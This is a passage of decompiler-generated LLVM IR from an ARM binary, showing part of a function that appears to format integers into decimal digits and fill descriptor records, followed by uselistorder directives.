  %v2_14cb0 = add i32 %v1_14cb0, 4
  %v3_14cb0 = inttoptr i32 %v2_14cb0 to i32*
  store i32 %v1_14cac, i32* %v3_14cb0, align 4
  store i32 ptrtoint (i32* @global_var_1819f.416 to i32), i32* %r3.global-to-local, align 4
  store i32 176, i32* %r2.global-to-local, align 4
  %v1_14cbc = load i32, i32* %r6.global-to-local, align 4
  %v2_14cbc = inttoptr i32 %v1_14cbc to i32*
  store i32 176, i32* %v2_14cbc, align 4
  %v0_14cc0 = load i32, i32* %r3.global-to-local, align 4
  %v1_14cc0 = load i32, i32* %r6.global-to-local, align 4
  %v2_14cc0 = add i32 %v1_14cc0, 8
  %v3_14cc0 = inttoptr i32 %v2_14cc0 to i32*
  store i32 %v0_14cc0, i32* %v3_14cc0, align 4
  %v0_14cc4 = load i32, i32* %r6.global-to-local, align 4
  %v1_14cc4 = add i32 %v0_14cc4, 12
  store i32 %v1_14cc4, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_14cc8

dec_label_pc_14cc8:                               ; preds = %dec_label_pc_14ca4, %dec_label_pc_14cac
  %v2_14cd0 = phi i32 [ %v1_14cb0, %dec_label_pc_14ca4 ], [ %v1_14cc4, %dec_label_pc_14cac ]
  %v0_14cc8 = load i32, i32* %r1.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_14cc8 = icmp slt i32 %v0_14cc8, 0
  store i1 %v1_14cc8, i1* %cpsr_n.global-to-local, align 1
  %v2_14cc8 = icmp eq i32 %v0_14cc8, 0
  store i1 %v2_14cc8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14cc8, label %.thread49, label %bb266

bb266:                                            ; preds = %dec_label_pc_14cc8
  store i32 112, i32* %r3.global-to-local, align 4
  %v3_14cd0 = inttoptr i32 %v2_14cd0 to i32*
  store i32 112, i32* %v3_14cd0, align 4
  %v1_14cd4 = load i32, i32* %r4.global-to-local, align 4
  %v2_14cd4 = load i32, i32* %r6.global-to-local, align 4
  %v3_14cd4 = add i32 %v2_14cd4, 8
  %v4_14cd4 = inttoptr i32 %v3_14cd4 to i32*
  store i32 %v1_14cd4, i32* %v4_14cd4, align 4
  %v1_14cd8 = load i32, i32* %r1.global-to-local, align 4
  %v2_14cd8 = load i32, i32* %r6.global-to-local, align 4
  %v3_14cd8 = add i32 %v2_14cd8, 4
  %v4_14cd8 = inttoptr i32 %v3_14cd8 to i32*
  store i32 %v1_14cd8, i32* %v4_14cd8, align 4
  %v1_14cdc = load i32, i32* %r6.global-to-local, align 4
  %v2_14cdc = add i32 %v1_14cdc, 12
  store i32 %v2_14cdc, i32* %r6.global-to-local, align 4
  br label %.thread49

.thread49:                                        ; preds = %dec_label_pc_14cc8, %bb266
  %v1_14d04 = phi i32 [ %v2_14cd0, %dec_label_pc_14cc8 ], [ %v2_14cdc, %bb266 ]
  %v0_14ce0 = load i32, i32* @sl, align 4
  %v1_14ce0 = add i32 %v0_14ce0, -103
  %v3_14ce0 = sub i32 102, %v0_14ce0
  %v4_14ce0 = and i32 %v3_14ce0, %v0_14ce0
  %v5_14ce0 = icmp slt i32 %v4_14ce0, 0
  store i1 %v5_14ce0, i1* %cpsr_v.global-to-local, align 1
  %v6_14ce0 = icmp slt i32 %v1_14ce0, 0
  store i1 %v6_14ce0, i1* %cpsr_n.global-to-local, align 1
  %v7_14ce0 = icmp eq i32 %v0_14ce0, 103
  store i1 %v7_14ce0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_14ce0, label %dec_label_pc_14ce8, label %dec_label_pc_14cf0

dec_label_pc_14ce8:                               ; preds = %.thread49
  %v0_14ce8 = load i32, i32* @lr, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_14ce8 = icmp slt i32 %v0_14ce8, 0
  store i1 %v1_14ce8, i1* %cpsr_n.global-to-local, align 1
  %v2_14ce8 = icmp eq i32 %v0_14ce8, 0
  store i1 %v2_14ce8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14ce8, label %dec_label_pc_14d1c, label %dec_label_pc_14cf0

dec_label_pc_14cf0:                               ; preds = %.thread49, %dec_label_pc_14ce8
  %v0_14cf0 = load i32, i32* %ip.global-to-local, align 4
  %v1_14cf0 = load i32, i32* %r1.global-to-local, align 4
  %v2_14cf0 = sub i32 %v1_14cf0, %v0_14cf0
  store i32 %v2_14cf0, i32* %r3.global-to-local, align 4
  store i32 %v1_14d00, i32* %ip.global-to-local, align 4
  %v2_14cf8 = sub i32 %v2_14cf0, %v1_14d00
  %v4_14cf8 = xor i32 %v2_14cf0, %v1_14d00
  %v5_14cf8 = xor i32 %v2_14cf8, %v2_14cf0
  %v6_14cf8 = and i32 %v5_14cf8, %v4_14cf8
  %v7_14cf8 = icmp slt i32 %v6_14cf8, 0
  store i1 %v7_14cf8, i1* %cpsr_v.global-to-local, align 1
  %v8_14cf8 = icmp slt i32 %v2_14cf8, 0
  store i1 %v8_14cf8, i1* %cpsr_n.global-to-local, align 1
  %v9_14cf8 = icmp eq i32 %v2_14cf0, %v1_14d00
  store i1 %v9_14cf8, i1* %cpsr_z.global-to-local, align 1
  %v2_14cfc = xor i1 %v8_14cf8, %v7_14cf8
  br i1 %v2_14cfc, label %dec_label_pc_14d00, label %dec_label_pc_14d1c

dec_label_pc_14d00:                               ; preds = %dec_label_pc_14cf0
  %v2_14d00 = sub i32 %v1_14d00, %v2_14cf0
  %v2_14d04 = add i32 %v1_14d04, 4
  %v3_14d04 = inttoptr i32 %v2_14d04 to i32*
  store i32 %v2_14d00, i32* %v3_14d04, align 4
  store i32 ptrtoint (i32* @global_var_1819f.416 to i32), i32* %r3.global-to-local, align 4
  store i32 176, i32* %r2.global-to-local, align 4
  %v1_14d10 = load i32, i32* %r6.global-to-local, align 4
  %v2_14d10 = inttoptr i32 %v1_14d10 to i32*
  store i32 176, i32* %v2_14d10, align 4
  %v0_14d14 = load i32, i32* %r3.global-to-local, align 4
  %v1_14d14 = load i32, i32* %r6.global-to-local, align 4
  %v2_14d14 = add i32 %v1_14d14, 8
  %v3_14d14 = inttoptr i32 %v2_14d14 to i32*
  store i32 %v0_14d14, i32* %v3_14d14, align 4
  %v0_14d18 = load i32, i32* %r6.global-to-local, align 4
  %v1_14d18 = add i32 %v0_14d18, 12
  store i32 %v1_14d18, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_14d1c

dec_label_pc_14d1c:                               ; preds = %dec_label_pc_14cf0, %dec_label_pc_14ce8, %dec_label_pc_14d00
  %v1_14db0.pre.pre = phi i32 [ %v1_14d04, %dec_label_pc_14cf0 ], [ %v1_14d04, %dec_label_pc_14ce8 ], [ %v1_14d18, %dec_label_pc_14d00 ]
  %v0_14d1c = load i32, i32* %r7.global-to-local, align 4
  %v1_14d1c = add i32 %v0_14d1c, -102
  %v3_14d1c = sub i32 101, %v0_14d1c
  %v4_14d1c = and i32 %v3_14d1c, %v0_14d1c
  %v5_14d1c = icmp slt i32 %v4_14d1c, 0
  store i1 %v5_14d1c, i1* %cpsr_v.global-to-local, align 1
  %v6_14d1c = icmp slt i32 %v1_14d1c, 0
  store i1 %v6_14d1c, i1* %cpsr_n.global-to-local, align 1
  %v7_14d1c = icmp eq i32 %v0_14d1c, 102
  store i1 %v7_14d1c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_14d1c, label %dec_label_pc_14da4, label %dec_label_pc_14d24

dec_label_pc_14d24:                               ; preds = %dec_label_pc_14d1c
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_14d28 = load i32, i32* %r0.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_14d28 = icmp slt i32 %v0_14d28, 0
  store i1 %v1_14d28, i1* %cpsr_n.global-to-local, align 1
  %v2_14d28 = icmp eq i32 %v0_14d28, 0
  store i1 %v2_14d28, i1* %cpsr_z.global-to-local, align 1
  store i32 %stack_var_-58.0130137, i32* %r8.global-to-local, align 4
  store i32 0, i32* %stack_var_-43, align 4
  %v4_14d3c = sub i32 0, %v0_14d28
  %storemerge179 = select i1 %v1_14d28, i32 %v4_14d3c, i32 %v0_14d28
  %tmp284 = ashr i32 %v0_14d28, 31
  %tmp285 = and i32 %tmp284, 2
  %tmp286 = add nuw nsw i32 %tmp285, 43
  store i32 %storemerge179, i32* %r4.global-to-local, align 4
  store i32 %tmp286, i32* %sl.global-to-local, align 4
  %v2_14d44 = ptrtoint i32* %stack_var_-43 to i32
  store i32 %v2_14d44, i32* %r5.global-to-local, align 4
  store i32 2, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_14d4c

dec_label_pc_14d4c:                               ; preds = %dec_label_pc_14d7c, %dec_label_pc_14d4c, %dec_label_pc_14d24
  %v0_14d4c = phi i32 [ %storemerge179, %dec_label_pc_14d24 ], [ %v0_14d68, %dec_label_pc_14d4c ], [ %v0_14d68, %dec_label_pc_14d7c ]
  store i32 %v0_14d4c, i32* %r0.global-to-local, align 4
  store i32 10, i32* %r1.global-to-local, align 4
  %v2_14d54 = call i32 @function_103f4(i32 %v0_14d4c, i32 10)
  %v1_14d58 = add i32 %v2_14d54, 48
  store i32 %v1_14d58, i32* %r3.global-to-local, align 4
  store i32 10, i32* @r1, align 4
  %v0_14d60 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_14d60, i32* @r0, align 4
  %v1_14d64 = trunc i32 %v1_14d58 to i8
  %v2_14d64 = load i32, i32* %r5.global-to-local, align 4
  %v3_14d64 = add i32 %v2_14d64, -1
  %v4_14d64 = inttoptr i32 %v3_14d64 to i8*
  store i8 %v1_14d64, i8* %v4_14d64, align 1
  %v5_14d64 = load i32, i32* %r5.global-to-local, align 4
  %v6_14d64 = add i32 %v5_14d64, -1
  store i32 %v6_14d64, i32* %r5.global-to-local, align 4
  %v0_14d68 = call i32 @function_15afc()
  store i32 %v0_14d68, i32* %r0.global-to-local, align 4
  %v0_14d6c = load i32, i32* %r7.global-to-local, align 4
  %v1_14d6c = add i32 %v0_14d6c, 1
  store i32 %v1_14d6c, i32* %r7.global-to-local, align 4
  %v1_14d70 = add i32 %v0_14d6c, -2
  %v3_14d70 = sub i32 1, %v0_14d6c
  %v4_14d70 = and i32 %v3_14d70, %v1_14d6c
  %v5_14d70 = icmp slt i32 %v4_14d70, 0
  store i1 %v5_14d70, i1* %cpsr_v.global-to-local, align 1
  %v6_14d70 = icmp slt i32 %v1_14d70, 0
  store i1 %v6_14d70, i1* %cpsr_n.global-to-local, align 1
  %v7_14d70 = icmp eq i32 %v1_14d6c, 3
  store i1 %v7_14d70, i1* %cpsr_z.global-to-local, align 1
  store i32 %v0_14d68, i32* %r4.global-to-local, align 4
  %v7_14d78 = icmp slt i32 %v1_14d6c, 4
  br i1 %v7_14d78, label %dec_label_pc_14d4c, label %dec_label_pc_14d7c

dec_label_pc_14d7c:                               ; preds = %dec_label_pc_14d4c
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_14d7c = icmp slt i32 %v0_14d68, 0
  store i1 %v1_14d7c, i1* %cpsr_n.global-to-local, align 1
  %v2_14d7c = icmp eq i32 %v0_14d68, 0
  store i1 %v2_14d7c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14d7c, label %dec_label_pc_14d84, label %dec_label_pc_14d4c

dec_label_pc_14d84:                               ; preds = %dec_label_pc_14d7c
  %v0_14d84 = load i32, i32* %r5.global-to-local, align 4
  %v1_14d84 = add i32 %v0_14d84, -1
  store i32 %v1_14d84, i32* %r3.global-to-local, align 4
  %v0_14d88 = load i32, i32* %sl.global-to-local, align 4
  %v1_14d88 = trunc i32 %v0_14d88 to i8
  %v4_14d88 = inttoptr i32 %v1_14d84 to i8*
  store i8 %v1_14d88, i8* %v4_14d88, align 1
  %v0_14d8c = load i32, i32* %r3.global-to-local, align 4
  %v1_14d8c = add i32 %v0_14d8c, -1
  store i32 %v1_14d8c, i32* %r2.global-to-local, align 4
  %v0_14d90 = load i32, i32* %r8.global-to-local, align 4
  %v1_14d90 = trunc i32 %v0_14d90 to i8
  %v4_14d90 = inttoptr i32 %v1_14d8c to i8*
  store i8 %v1_14d90, i8* %v4_14d90, align 1
  store i32 112, i32* %r3.global-to-local, align 4
  %v0_14d98 = load i32, i32* %r6.global-to-local, align 4
  %v1_14d98 = inttoptr i32 %v0_14d98 to i32*
  store i32 112, i32* %v1_14d98, align 4
  %v3_14d98 = add i32 %v0_14d98, 4
  %v4_14d98 = inttoptr i32 %v3_14d98 to i32*
  %v5_14d98 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v5_14d98, i32* %v4_14d98, align 4
  %v0_14d9c = load i32, i32* %r2.global-to-local, align 4
  %v1_14d9c = load i32, i32* %r6.global-to-local, align 4
  %v2_14d9c = add i32 %v1_14d9c, 8
  %v3_14d9c = inttoptr i32 %v2_14d9c to i32*
  store i32 %v0_14d9c, i32* %v3_14d9c, align 4
  %v0_14da0 = load i32, i32* %r6.global-to-local, align 4
  %v1_14da0 = add i32 %v0_14da0, 12
  store i32 %v1_14da0, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_14da4

dec_label_pc_14da4:                               ; preds = %dec_label_pc_14d1c, %.thread121, %dec_label_pc_14d84
  %v1_14db0.pre = phi i32 [ %v2_1485c, %.thread121 ], [ %v1_14da0, %dec_label_pc_14d84 ], [ %v1_14db0.pre.pre, %dec_label_pc_14d1c ]
  %v2_14da4 = ptrtoint i32* %stack_var_-160 to i32
  store i32 %v2_14da4, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_14da8

dec_label_pc_14da8:                               ; preds = %dec_label_pc_14da8, %dec_label_pc_14da4
  %v0_14da8 = phi i32 [ %v2_14da4, %dec_label_pc_14da4 ], [ %v4_14da8, %dec_label_pc_14da8 ]
  %stack_var_-188.0 = phi i32 [ %v3_1470c, %dec_label_pc_14da4 ], [ %v2_14db4, %dec_label_pc_14da8 ]
  %v1_14da8 = inttoptr i32 %v0_14da8 to i32*
  %v2_14da8 = load i32, i32* %v1_14da8, align 4
  store i32 %v2_14da8, i32* %r3.global-to-local, align 4
  %v4_14da8 = add i32 %v0_14da8, 12
  store i32 %v4_14da8, i32* %r2.global-to-local, align 4
  %v3_14db0 = icmp ult i32 %v4_14da8, %v1_14db0.pre
  %v2_14db4 = sub i32 %stack_var_-188.0, %v2_14da8
  store i32 %v2_14db4, i32* %r0.global-to-local, align 4
  br i1 %v3_14db0, label %dec_label_pc_14da8, label %dec_label_pc_14dc0

dec_label_pc_14dc0:                               ; preds = %dec_label_pc_14da8
  %v3_14dc0 = load i8, i8* %stack_var_-42, align 1
  %v4_14dc0 = sext i8 %v3_14dc0 to i32
  store i32 %v4_14dc0, i32* %r3.global-to-local, align 4
  store i32 %v4_14dc0, i32* %r2.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_14dc4 = icmp slt i8 %v3_14dc0, 0
  store i1 %v1_14dc4, i1* %cpsr_n.global-to-local, align 1
  %v2_14dc4 = icmp eq i8 %v3_14dc0, 0
  store i1 %v2_14dc4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14dc4, label %bb271, label %bb270

bb270:                                            ; preds = %dec_label_pc_14dc0
  store i32 1, i32* %r2.global-to-local, align 4
  br label %bb271

bb271:                                            ; preds = %dec_label_pc_14dc0, %bb270
  %v1_14e18 = phi i32 [ %v4_14dc0, %dec_label_pc_14dc0 ], [ 1, %bb270 ]
  %v2_14dcc = sub i32 %v2_14db4, %v1_14e18
  store i32 %v2_14dcc, i32* %r1.global-to-local, align 4
  %v2_14dd0 = ptrtoint i8* %stack_var_-42 to i32
  store i32 %v2_14dd0, i32* %r3.global-to-local, align 4
  store i32 160, i32* %r0.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_14dd8 = icmp slt i32 %v2_14dcc, 0
  store i1 %v1_14dd8, i1* %cpsr_n.global-to-local, align 1
  %v2_14dd8 = icmp eq i32 %v2_14dcc, 0
  store i1 %v2_14dd8, i1* %cpsr_z.global-to-local, align 1
  store i32 160, i32* %stack_var_-176, align 4
  %tmp272 = icmp slt i32 %v2_14dcc, 1
  br i1 %tmp272, label %dec_label_pc_14e40, label %dec_label_pc_14dec

dec_label_pc_14dec:                               ; preds = %bb271
  %v2_14dec = load i32, i32* %stack_var_-200, align 4
  store i32 %v2_14dec, i32* %ip.global-to-local, align 4
  %v1_14df0 = add i32 %v2_14dec, 12
  %v2_14df0 = inttoptr i32 %v1_14df0 to i32*
  %v3_14df0 = load i32, i32* %v2_14df0, align 4
  store i32 %v3_14df0, i32* %r3.global-to-local, align 4
  %v1_14df4 = and i32 %v3_14df0, 8
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_14df4 = icmp eq i32 %v1_14df4, 0
  store i1 %v2_14df4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14df4, label %dec_label_pc_14e0c, label %dec_label_pc_14dfc

dec_label_pc_14dfc:                               ; preds = %dec_label_pc_14dec
  store i32 ptrtoint (i32* @global_var_1819f.416 to i32), i32* %r3.global-to-local, align 4
  %v1_14e00 = add i32 %v1_14db0.pre, 12
  store i32 %v1_14e00, i32* %r5.global-to-local, align 4
  %v1_14e04 = inttoptr i32 %v1_14db0.pre to i32*
  store i32 160, i32* %v1_14e04, align 4
  %v3_14e04 = add i32 %v1_14db0.pre, 4
  %v4_14e04 = inttoptr i32 %v3_14e04 to i32*
  %v5_14e04 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_14e04, i32* %v4_14e04, align 4
  %v6_14e04 = add i32 %v1_14db0.pre, 8
  %v7_14e04 = inttoptr i32 %v6_14e04 to i32*
  %v8_14e04 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v8_14e04, i32* %v7_14e04, align 4
  br label %dec_label_pc_14e44

dec_label_pc_14e0c:                               ; preds = %dec_label_pc_14dec
  store i32 %v2_14dec, i32* %r0.global-to-local, align 4
  %v1_14e10 = add i32 %v2_14dec, 16
  %v2_14e10 = inttoptr i32 %v1_14e10 to i32*
  %v3_14e10 = load i32, i32* %v2_14e10, align 4
  store i32 %v3_14e10, i32* %r3.global-to-local, align 4
  %v1_14e14 = add i32 %v3_14e10, -48
  %v3_14e14 = sub i32 47, %v3_14e10
  %v4_14e14 = and i32 %v3_14e14, %v3_14e10
  %v5_14e14 = icmp slt i32 %v4_14e14, 0
  store i1 %v5_14e14, i1* %cpsr_v.global-to-local, align 1
  %v6_14e14 = icmp slt i32 %v1_14e14, 0
  store i1 %v6_14e14, i1* %cpsr_n.global-to-local, align 1
  %v7_14e14 = icmp eq i32 %v3_14e10, 48
  store i1 %v7_14e14, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_14e14, label %dec_label_pc_14e24, label %bb273

bb273:                                            ; preds = %dec_label_pc_14e0c
  store i32 %v2_14db4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_14e40

dec_label_pc_14e24:                               ; preds = %dec_label_pc_14e0c
  %v3_14e24 = load i32, i32* %stack_var_-160, align 4
  store i32 %v1_14db0.pre, i32* %r5.global-to-local, align 4
  %v2_14e2c = add i32 %v3_14e24, %v2_14dcc
  store i32 %v2_14e2c, i32* %r3.global-to-local, align 4
  store i32 %v2_14e2c, i32* %stack_var_-160, align 4
  br label %dec_label_pc_14e44

dec_label_pc_14e38:                               ; preds = %dec_label_pc_14e4c
  store i32 -1, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_14e7c

dec_label_pc_14e40:                               ; preds = %bb273, %bb271
  store i32 %v1_14db0.pre, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_14e44

dec_label_pc_14e44:                               ; preds = %dec_label_pc_14e24, %dec_label_pc_14dfc, %dec_label_pc_14e40
  store i32 0, i32* %r6.global-to-local, align 4
  %v2_14e48 = ptrtoint i32* %stack_var_-176 to i32
  store i32 %v2_14e48, i32* %r4.global-to-local, align 4
  %v3_14e54.pre = load i32, i32* %stack_var_0, align 4
  br label %dec_label_pc_14e4c

dec_label_pc_14e4c:                               ; preds = %dec_label_pc_14e74, %dec_label_pc_14e44
  %v0_14e4c = phi i32 [ %v1_14e6c, %dec_label_pc_14e74 ], [ %v2_14e48, %dec_label_pc_14e44 ]
  %v1_14e4c = inttoptr i32 %v0_14e4c to i32*
  %v2_14e4c = load i32, i32* %v1_14e4c, align 4
  store i32 %v2_14e4c, i32* %r1.global-to-local, align 4
  %v3_14e4c = add i32 %v0_14e4c, 4
  %v4_14e4c = inttoptr i32 %v3_14e4c to i32*
  %v5_14e4c = load i32, i32* %v4_14e4c, align 4
  store i32 %v5_14e4c, i32* %r2.global-to-local, align 4
  %v6_14e4c = add i32 %v0_14e4c, 8
  %v7_14e4c = inttoptr i32 %v6_14e4c to i32*
  %v8_14e4c = load i32, i32* %v7_14e4c, align 4
  store i32 %v8_14e4c, i32* %r3.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  store i32 %v3_14e54.pre, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v3_14e54.pre)
  %v0_14e60 = load i32, i32* %r4.global-to-local, align 4
  %v1_14e60 = add i32 %v0_14e60, 4
  %v2_14e60 = inttoptr i32 %v1_14e60 to i32*
  %v3_14e60 = load i32, i32* %v2_14e60, align 4
  store i32 %v3_14e60, i32* %r3.global-to-local, align 4
  %v0_14e64 = load i32, i32* %r0.global-to-local, align 4
  %v2_14e64 = sub i32 %v0_14e64, %v3_14e60
  %v4_14e64 = xor i32 %v0_14e64, %v3_14e60
  %v5_14e64 = xor i32 %v2_14e64, %v0_14e64
  %v6_14e64 = and i32 %v5_14e64, %v4_14e64
  %v7_14e64 = icmp slt i32 %v6_14e64, 0
  store i1 %v7_14e64, i1* %cpsr_v.global-to-local, align 1
  %v8_14e64 = icmp slt i32 %v2_14e64, 0
  store i1 %v8_14e64, i1* %cpsr_n.global-to-local, align 1
  %v9_14e64 = icmp eq i32 %v0_14e64, %v3_14e60
  store i1 %v9_14e64, i1* %cpsr_z.global-to-local, align 1
  %v0_14e68 = load i32, i32* %r6.global-to-local, align 4
  %v2_14e68 = add i32 %v0_14e68, %v0_14e64
  store i32 %v2_14e68, i32* %r6.global-to-local, align 4
  %v1_14e6c = add i32 %v0_14e60, 12
  store i32 %v1_14e6c, i32* %r4.global-to-local, align 4
  br i1 %v9_14e64, label %dec_label_pc_14e74, label %dec_label_pc_14e38

dec_label_pc_14e74:                               ; preds = %dec_label_pc_14e4c
  %v1_14e74 = load i32, i32* %r5.global-to-local, align 4
  %v2_14e74 = sub i32 %v1_14e6c, %v1_14e74
  %v3_14e74 = icmp ult i32 %v1_14e6c, %v1_14e74
  %v4_14e74 = xor i32 %v1_14e74, %v1_14e6c
  %v5_14e74 = xor i32 %v2_14e74, %v1_14e6c
  %v6_14e74 = and i32 %v5_14e74, %v4_14e74
  %v7_14e74 = icmp slt i32 %v6_14e74, 0
  store i1 %v7_14e74, i1* %cpsr_v.global-to-local, align 1
  %v8_14e74 = icmp slt i32 %v2_14e74, 0
  store i1 %v8_14e74, i1* %cpsr_n.global-to-local, align 1
  %v9_14e74 = icmp eq i32 %v1_14e6c, %v1_14e74
  store i1 %v9_14e74, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_14e74, label %dec_label_pc_14e4c, label %dec_label_pc_14e7c

dec_label_pc_14e7c:                               ; preds = %dec_label_pc_14e74, %dec_label_pc_14e38
  %v0_14e7c = phi i32 [ -1, %dec_label_pc_14e38 ], [ %v2_14e68, %dec_label_pc_14e74 ]
  store i32 %v0_14e7c, i32* %r0.global-to-local, align 4
  %v2_14e84 = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_14e84, i32* %r4.global-to-local, align 4
  store i32 %v6_146bc, i32* @r5, align 4
  store i32 %v9_146bc, i32* @r6, align 4
  store i32 %v12_146bc, i32* @r7, align 4
  store i32 %v15_146bc, i32* @r8, align 4
  store i32 %v18_146bc, i32* @sb, align 4
  store i32 %v21_146bc, i32* @sl, align 4
  ret i32 %v0_14e7c

; uselistorder directives
  uselistorder i32 %v0_14e7c, { 1, 0 }
  uselistorder i32 %v2_14e74, { 1, 0 }
  uselistorder i32 %v1_14e74, { 2, 0, 1, 3 }
  uselistorder i32 %v1_14e6c, { 4, 0, 1, 5, 3, 6, 2 }
  uselistorder i32 %v2_14e64, { 1, 0 }
  uselistorder i32 %v0_14e64, { 0, 3, 1, 2, 4 }
  uselistorder i32 %v3_14e60, { 2, 0, 1, 3 }
  uselistorder i32 %v0_14e4c, { 2, 1, 0 }
  uselistorder i32 %v3_14e10, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v2_14dec, { 1, 0, 2, 3 }
  uselistorder i32 %v2_14db4, { 0, 1, 3, 2 }
  uselistorder i32 %v4_14da8, { 1, 2, 0 }
  uselistorder i32 %v0_14da8, { 1, 0 }
  uselistorder i32 %v1_14db0.pre, { 6, 5, 3, 2, 1, 4, 0 }
  uselistorder i32 %v0_14d68, { 2, 3, 4, 5, 1, 0 }
  uselistorder i32 %v0_14d4c, { 1, 0 }
  uselistorder i32 %storemerge179, { 1, 0 }
  uselistorder i32 %v0_14d28, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v0_14d1c, { 3, 0, 1, 2 }
  uselistorder i32 %v2_14cf8, { 1, 0 }
  uselistorder i32 %v2_14cf0, { 2, 4, 0, 1, 3, 5 }
  uselistorder i32 %v0_14ce8, { 1, 0 }
  uselistorder i32 %v0_14ce0, { 3, 0, 1, 2 }
  uselistorder i32 %v0_14cc8, { 1, 0 }
  uselistorder i32 %v1_14ca4, { 1, 2, 0, 3 }
  uselistorder i32 %v0_14ca4, { 1, 0, 2 }
  uselistorder i32 %v0_14c7c, { 3, 0, 1, 2 }
  uselistorder i1 %v2_14c5c, { 2, 1, 0 }
  uselistorder i32 %v2_14be8, { 1, 3, 2, 4, 0 }
  uselistorder i32 %v2_14bd8, { 2, 1, 3, 5, 0, 4, 6 }
  uselistorder i32 %v1_14d00, { 2, 6, 0, 7, 5, 1, 3, 4, 8 }
  uselistorder i32 %v0_14c44, { 3, 0, 5, 4, 6, 7, 9, 1, 2, 8 }
  uselistorder i32 %v0_14b84, { 1, 4, 0, 2, 3 }
  uselistorder i1 %v2_14b68, { 1, 0 }
  uselistorder i32 %v1_14b60, { 1, 2, 0 }
  uselistorder i32 %v2_14b54, { 1, 0 }
  uselistorder i32 %v1_14b54, { 1, 2, 0, 3 }
  uselistorder i32 %v0_14b54, { 3, 4, 0, 5, 6, 1, 2, 7 }
  uselistorder i32 %v1_14b4c, { 1, 0, 2 }
  uselistorder i32 %v0_14b44, { 3, 0, 1, 2 }
  uselistorder i1 %v3_14b24, { 1, 0 }
  uselistorder i32 %v2_14b24, { 1, 0 }
  uselistorder i32 %v2_14b20, { 3, 2, 1, 4, 5, 7, 0, 8, 6, 9 }
  uselistorder i1 %v7_14b0c, { 1, 0 }
  uselistorder i32 %v1_14b10, { 2, 1, 0 }
  uselistorder i1 %v2_14b00, { 1, 0 }
  uselistorder i32 %v0_14afc, { 2, 4, 0, 1, 5, 3, 7, 6 }
  uselistorder i1 %v2_14ae4, { 1, 0 }
  uselistorder i32 %stack_var_-192.7, { 1, 0, 2 }
  uselistorder i32 %v1_14ad8, { 0, 2, 1, 4, 3 }
  uselistorder i32 %v1_14a90, { 1, 2, 0 }
  uselistorder i32 %v2_14a8c, { 1, 0, 2, 3 }
  uselistorder i32 %v0_14a74, { 1, 3, 5, 6, 0, 4, 2 }
  uselistorder i1 %v2_14a6c, { 1, 0 }
  uselistorder i32 %v0_14a78, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v5_14a54, { 1, 0 }
  uselistorder i32 %v0_14a40, { 2, 3, 0, 6, 1, 4, 5 }
  uselistorder i32 %v0_14a34, { 0, 2, 1, 3 }
  uselistorder i32 %v0_14a28, { 1, 4, 0, 2, 3 }
  uselistorder i32 %v0_14a24, { 0, 1, 3, 2 }
  uselistorder i32 %v0_14a00, { 1, 0 }
  uselistorder i32 %v0_149b4, { 1, 0 }
  uselistorder i32 %v0_149a0, { 1, 0, 2, 3 }
  uselistorder i32 %stack_var_-192.6, { 1, 2, 0, 3 }
  uselistorder i32 %v2_148c8, { 1, 0, 2 }
  uselistorder i32 %v0_148bc, { 2, 3, 1, 0, 4, 5, 6 }
  uselistorder i32 %v0_148b8, { 1, 0, 2, 3 }
  uselistorder i32 %v3_148b4, { 2, 1, 0 }
  uselistorder i32 %v1_148a0, { 4, 3, 2, 0, 1 }
  uselistorder i32 %stack_var_-192.2, { 1, 2, 0, 3 }
  uselistorder i32 %v0_14894, { 1, 0 }
  uselistorder i32 %v5_1484c, { 1, 0 }
  uselistorder i32 %v0_14838, { 0, 4, 1, 2, 3 }
  uselistorder i32 %v0_14758.v1_1476c8, { 1, 0 }
  uselistorder i32 %v0_14800, { 1, 0 }
  uselistorder i32 %v4_147ec, { 1, 2, 0 }
  uselistorder i32 %v0_14790, { 1, 0, 2, 3 }
  uselistorder i32 %v1_14a70, { 1, 2, 3, 6, 4, 5, 0 }
  uselistorder i32 %v1_146cc, { 1, 0 }
  uselistorder i32* %stack_var_-79, { 1, 2, 0, 3 }
  uselistorder i32* %stack_var_-78, { 1, 2, 0 }
  uselistorder i32* %stack_var_-176, { 1, 0 }
  uselistorder i32* %stack_var_-43, { 1, 0 }
  uselistorder i32* %stack_var_-160, { 0, 1, 4, 2, 3 }
  uselistorder i8* %stack_var_-42, { 0, 5, 4, 3, 2, 1 }
  uselistorder i32 %tmp, { 3, 2, 1, 0, 4, 5, 6, 7 }
  uselistorder i32* %r7.global-to-local, { 0, 1, 2, 3, 6, 4, 5, 7 }
